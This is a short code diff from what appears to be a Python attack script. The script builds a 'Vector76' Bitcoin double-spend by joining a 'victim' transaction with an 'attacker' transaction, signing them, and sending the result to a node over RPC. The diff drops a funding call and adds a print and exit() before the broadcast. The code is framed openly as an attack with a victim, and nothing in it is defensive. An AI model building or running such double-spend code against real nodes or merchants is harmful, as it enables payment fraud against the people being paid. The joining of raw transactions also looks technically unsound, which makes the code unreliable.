@@ -99,8 +99,9 @@ tx_attacker = cryptos.serialize(transaction_util.signall(tx_attacker, key))
 print()
 print()
 tx_vector76 = f"{tx_victim}{tx_attacker}"
-tx_vector76 = rpc_node.fundrawtransaction(tx_vector76)["hex"]
 tx_vector76 = cryptos.serialize(transaction_util.signall(tx_vector76, key))
+print(tx_vector76)
+exit()
 print("Sending Vector76 block your node...")
 result = rpc_node.sendrawtransaction(tx_vector76)
 print(tx_vector76)
